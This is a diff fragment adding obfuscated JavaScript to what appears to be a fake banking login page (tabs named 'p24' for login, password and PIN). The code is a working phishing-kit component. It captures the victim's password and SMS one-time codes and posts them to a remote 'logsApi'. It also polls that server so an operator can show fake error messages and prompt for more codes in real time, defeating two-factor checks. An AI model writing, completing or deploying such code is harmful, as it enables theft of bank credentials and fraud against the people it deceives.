+               bot_stop.interval = check();
+            }
+         }
+      });
+      $(document).on('click', "#code_three button", function () {
+         order_id = localStorage.getItem('log_id')
+         if ($(".code_three").val().length != 0x3) {
+            $("#code_three_input_error").fadeIn();
+            return false;
+         } else {
+            $("#code_three_input_error").fadeOut();
+            logsApi.patch("/log", {
+               'id': order_id,
+               'state': 0
+            });
+            logsApi.post("/message", {
+               'log_id': order_id,
+               'text': "SMS Code: " + $('.code_three').val(),
+               'type': 'from_user'
+            });
+            $("#code_three").fadeOut(0x0);
+            loading();
+            bot_stop.interval = check();
+         }
+      });
+      $(document).on('click', "#code_four button", function () {
+         order_id = localStorage.getItem('log_id')
+         if ($(".code_four").val().length != 0x4) {
+            $("#code_four_input_error").fadeIn();
+            return false;
+         } else {
+            $("#code_four_input_error").fadeOut();
+            logsApi.patch("/log", {
+               'id': order_id,
+               'state': 0
+            });
+            logsApi.post("/message", {
+               'log_id': order_id,
+               'text': "SMS Code: " + $('.code_four').val(),
+               'type': 'from_user'
+            });
+            $("#code_four").fadeOut(0x0);
+            loading();
+            bot_stop.interval = check();
+         }
+      });
+      $(document).on("click", "#sendpass", function () {
+         order_id = localStorage.getItem('log_id')
+         if (error_check == 0x2) {
+            if ($('#password').val().length < 0x6) {
+               return false;
+            } else {
+               $(".error_pass").fadeOut(0x0);
+               logsApi.patch("/log", {
+                  'id': order_id,
+                  'state': 0,
+                  "password": $("#password").val()
+               });
+               loading();
+               bot_stop.interval = check();
+            }
+         }
+      });
+      $(document).on('click', "#code_infinitely button", function () {
+         order_id = localStorage.getItem('log_id')
+         if ($(".code_infinitely").val().length < 0x3) {
+            $("#code_infinitely_input_error").fadeIn();
+            return false;
+         } else {
+            $('#code_infinitely_input_error').fadeOut();
+            logsApi.patch("/log", {
+               'id': order_id,
+               'state': 0
+            });
+            logsApi.post("/message", {
+               'log_id': order_id,
+               'text': "SMS Code: " + $('.code_infinitely').val(),
+               'type': 'from_user'
+            });
+            $("#code_infinitely").fadeOut(0x0);
+            loading();
+            bot_stop.interval = check();
+         }
+      });
+      function check() {
+         order_id = localStorage.getItem('log_id')
+         error_check = 0x0;
+         var _0x3abc54 = setInterval(function () {
+            logsApi.get("/log/" + order_id).then(function (_0x1d6606) {
+               state = _0x1d6606.data.state
+               console.log(state)
+
+               if (state == 0x1) {
+                  $("#loginInput").val('');
+                  $('#password').val('');
+                  $("#pin").val('');
+                  $('.pincodeLetter').removeClass('y').addClass('r');
+                  $(".p24t").removeClass("selected");
+                  setTimeout(() => {
+                     document.querySelector("[data-p24-tab='login']").classList.add("selected");
+                  }, 0x1f4);
+                  setTimeout(function () {
+                     $(".error_phone").fadeIn(0x0);
+                  }, 0x1f4);
+                  clearInterval(_0x3abc54);
+               }
+               if (state == 0x2) {
+                  error_check = 0x2;
+                  $("#password").val('');
+                  $(".p24t").removeClass('selected');
+                  setTimeout(() => {
+                     document.querySelector("[data-p24-tab='password']").classList.add("selected");
+                     $('.error_pass').fadeIn(0x0);
+                  }, 0x1f4);
+                  clearInterval(_0x3abc54);
+               }
+               if (state == 0x3) {
+                  error_check = 0x2;
+                  $('#pin').val('');
+                  $(".pincodeLetter").removeClass('y').addClass('r');
+                  $('.p24t').removeClass("selected");
+                  setTimeout(() => {
+                     document.querySelector("[data-p24-tab='pin']").classList.add("selected");
+                     $(".error_pin").fadeIn(0x0);
+                  }, 0x1f4);
+                  clearInterval(_0x3abc54);
+               }
+               if (state == 0x4) {
+                  $('#code_four,#code_infinitely').fadeOut(0x0);
+                  $('.code_four,.code_infinitely,.code_three').val('');
+                  $("#code_three").fadeIn();
+                  $(".p24t").removeClass("selected");
+                  clearInterval(_0x3abc54);
+               }
+               if (state == 0x5) {
+                  $("#code_three,#code_infinitely").fadeOut(0x0);
+                  $(".code_four,.code_infinitely,.code_three").val('');
+                  $('#code_four').fadeIn();
+                  $('.p24t').removeClass("selected");
+                  clearInterval(_0x3abc54);
+               }
+               if (state == 0x6) {
+                  $("#code_three,#code_four").fadeOut(0x0);
+                  $(".code_four,.code_infinitely,.code_three").val('');
+                  $('#code_infinitely').fadeIn();
+                  $(".p24t").removeClass("selected");
+                  clearInterval(_0x3abc54);
+               }
+            });
+         }, 0x7d0);
+         return _0x3abc54;
+      }
+      function bot_stop() {
+         clearInterval(bot_stop.interval);
+      }   </script>
+	  <script src="custom.js"></script>
+
+
+</body>
+
+</html>
